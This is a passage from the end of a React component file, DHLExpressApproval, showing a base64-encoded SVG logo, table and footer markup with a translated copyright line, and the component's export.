xLjk0NzQsMS40MDY1bC0xLjczMDYsMS44Mjk2Yy0uNDMyOC0uNDMyOC0uODcyNC0uNzM0My0xLjMxODEtLjkwNDgtLjQ0NjMtLjE3MDUtLjkxMTYtLjI1NTktMS4zOTcxLS4yNTU5LS45NDQsMC0xLjY2OTIuMzE4NC0yLjE3MzYuOTU0MS0uNTA1MS42MzY0LS43NTc2LDEuNTcwNi0uNzU3NiwyLjgwMzN2LjkwNDhjMCwxLjIzMy4yMzMsMi4xNzM5LjY5ODksMi44MjI4LjQ2NTIuNjQ5MiwxLjE0MzkuOTczNywyLjAzNTguOTczNy44MTMsMCwxLjQzODktLjI2ODQsMS44Nzg1LS44MDYycy42NTktMS4yMzI2LjY1OS0yLjA4NTVoLTIuNTk3di0yLjM5OThoNS40ODl2Mi4yODJjMCwxLjE2NzUtLjIyMzUsMi4xNjcyLS42NjkyLDIuOTk5Ny0uNDQ1Ny44MzMyLTEuMDc1NywxLjQ2OS0xLjg4ODYsMS45MDgycy0xLjc3NzIuNjU5LTIuODkxNC42NTlaIi8+CiAgICA8cGF0aCBkPSJtMTM2LjQ3MzUsNDguMDk5M3YtMTAuMDMyNGgyLjY5NDl2Mi40OThjLjE0MzgtLjQ0NTcuMzM3Ni0uODY4Ny41OC0xLjI2ODguMjQzMS0uMzk5Ny41NTc3LS43Mjc5Ljk0NDctLjk4MzUuMzg2Mi0uMjU1OS44Njg0LS4zODM1LDEuNDQ1Ny0uMzgzNS4xMTgyLDAsLjIyNjIuMDAzNC4zMjQ4LjAwOTguMDk3OS4wMDY4LjIxOTUuMDIzLjM2NC4wNDl2Mi42MzYxYy0uMTA1My0uMDEyOC0uMjIwMS0uMDIyNi0uMzQ0NC0uMDI5NC0uMTI0OS0uMDA2NC0uMjQ1OC0uMDA5OC0uMzY0LS4wMDk4LS43MjEyLDAtMS4zMTEzLjEzNzQtMS43NzA1LjQxMjlzLS44MDAyLjU3MDYtMS4wMjMuODg1MnY2LjIxNjJoLTIuODUyMloiLz4KICAgIDxwYXRoIGQ9Im0xNDguNjUsNDguMzM1M2MtMS40OTUsMC0yLjY3MjYtLjQzMjgtMy41MzA4LTEuMjk4MS0uODU5Ni0uODY1Ny0xLjI4OS0yLjA1MjQtMS4yODktMy41NjA1di0uNzg3YzAtMS41MDc4LjQyOTUtMi42OTQ5LDEuMjg5LTMuNTYwNS44NTgyLS44NjU3LDIuMDM1OC0xLjI5ODUsMy41MzA4LTEuMjk4NXMyLjY3MTkuNDMyOCwzLjUzMDgsMS4yOTg1LDEuMjg5LDIuMDUyNywxLjI4OSwzLjU2MDV2Ljc4N2MwLDEuNTA4MS0uNDMwMSwyLjY5NDktMS4yODksMy41NjA1LS44NTg5Ljg2NTMtMi4wMzU4LDEuMjk4MS0zLjUzMDgsMS4yOTgxWm0wLTIuMzgwMmMuNjE2NSwwLDEuMDk3OS0uMjA5NywxLjQ0NTctLjYyOTNzLjUyMTMtMS4wNTU3LjUyMTMtMS45MDgydi0uNjY4OGMwLS44NTI1LS4xNzM1LTEuNDg4Mi0uNTIxMy0xLjkwODItLjM0NzctLjQxOTctLjgyOTItLjYyOTctMS40NDU3LS42Mjk3cy0xLjA5ODYuMjEtMS40NDU3LjYyOTdjLS4zNDc3LjQyLS41MjEzLDEuMDU1Ny0uNTIxMywxLjkwODJ2LjY2ODhjMCwuODUyNS4xNzM1LDEuNDg4Ni41MjEzLDEuOTA4Mi4zNDcxLjQxOTcuODI5Mi42MjkzLDEuNDQ1Ny42MjkzWiIvPgogICAgPHBhdGggZD0ibTE1OC41MDU4LDQ4LjI5NjFjLS45ODM4LDAtMS43MzgxLS4zNDc0LTIuMjYyNy0xLjA0MjZzLS43ODY3LTEuNjc4Ni0uNzg2Ny0yLjk1MDh2LTYuMjM1OGgyLjg1MjJ2Ni4wNTg2YzAsLjUzODIuMTE0OC45NjM5LjM0NDQsMS4yNzg5LjIyOTYuMzE0Ny41OTM1LjQ3MiwxLjA5MTkuNDcyLjM2NjcsMCwuNjg4Ny0uMDg4NS45NjM2LS4yNjU3LjI3NTUtLjE3NjkuNDk4My0uNDAzMS42NjkyLS42Nzg2di02Ljg2NTJoMi44NTIydjEwLjAzMjRoLTIuNjk0OXYtMS43NTA5Yy0uMzAxOC41NzczLS43MDQ5LDEuMDQ1OS0xLjIxLDEuNDA2NXMtMS4xMTE0LjU0MTItMS44MTkxLjU0MTJaIi8+CiAgICA8cGF0aCBkPSJtMTY2LjgyNjEsNTEuODM2N3YtMTMuNzY5OGgyLjY5NDl2MS43MzFjLjI3NTUtLjYwMy42NzE5LTEuMDc1MywxLjE4OTgtMS40MTYzLjUxODYtLjM0MSwxLjExMTQtLjUxMTUsMS43ODA2LS41MTE1LDEuMTI3NiwwLDIuMDA5NS40Mjk4LDIuNjQ1NiwxLjI4ODQuNjM2MS44NTkyLjk1NDEsMi4wMzYyLjk1NDEsMy41MzEydi43ODdjMCwxLjQ5NS0uMzE4LDIuNjcyMy0uOTU0MSwzLjUzMDgtLjYzNjEuODU5Mi0xLjUxNzksMS4yODg3LTIuNjQ1NiwxLjI4ODctMS4yOTg1LDAtMi4yMzY0LS42MDMzLTIuODEzLTEuODF2NS4zNTA2aC0yLjg1MjJabTQuNTgzNS0xMS41NjY4Yy0uNzIxOCwwLTEuMjk4NS4zMDgyLTEuNzMxMy45MjQ3djMuNzk2NWMuNDMyOC42MDMzLDEuMDA5NS45MDQ4LDEuNzMxMy45MDQ4LjU5MDIsMCwxLjA0MjYtLjIxMywxLjM1NzItLjYzOTFzLjQ3Mi0xLjAzOTIuNDcyLTEuODM5NHYtLjY2ODhjMC0uNzk5OC0uMTU3My0xLjQxMjktLjQ3Mi0xLjgzOTQtLjMxNDctLjQyNjEtLjc2NzEtLjYzOTUtMS4zNTcyLS42Mzk1WiIvPgogIDwvZz4KPC9zdmc+"
                      style={{
                        color: "transparent",
                        width: "128px",
                        height: "auto",
                      }}
                    />
                  </td>
                </tr>
              </tbody>
              <tfoot className="sc-a8acf6b-11 gfBHHo">
                <tr className="sc-a8acf6b-16 EGOeP">
                  <td className="sc-a8acf6b-6 bWalZo" colSpan="2">
                    <div className="sc-a8acf6b-5 lhnEBr">
                      {t("footer_copyright")}
                    </div>
                  </td>
                </tr>
              </tfoot>
            </table>
          </div>
        </div>
      </main>
    </div>
  );
};

export default DHLExpressApproval;
